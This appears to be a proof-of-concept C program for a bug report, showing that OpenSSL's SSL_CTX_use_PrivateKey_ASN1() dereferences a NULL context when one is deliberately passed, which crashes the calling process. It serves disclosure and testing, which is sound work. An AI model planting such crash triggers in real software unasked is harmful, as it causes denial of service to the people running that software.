/*
 * PoC: NULL pointer dereference in SSL_CTX_use_PrivateKey_ASN1()
 * Confirmed on: OpenSSL master, commit 6983b5c (2026-04-16)
 *
 * Trigger: SSL_CTX_use_PrivateKey_ASN1(type, NULL, data, len)
 * Crash:   ssl_rsa.c:446 — ctx->libctx member access through NULL ctx
 */

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <stdio.h>

int main(void)
{
    OPENSSL_init_ssl(0, NULL);

    /* Minimal DER-encoded RSA key stub; crash happens before parsing. */
    static const unsigned char der[] = { 0x30, 0x06, 0x02, 0x01, 0x00,
                                         0x02, 0x01, 0x00 };

    /*
     * SSL_CTX_use_PrivateKey_ASN1() passes ctx->libctx and ctx->propq
     * directly to d2i_PrivateKey_ex() at line 422 without checking ctx.
     */
    SSL_CTX *ctx = NULL;   /* intentionally NULL */
    SSL_CTX_use_PrivateKey_ASN1(EVP_PKEY_RSA, ctx, der, (long)sizeof(der));  /* crash here */

    return 0;
}
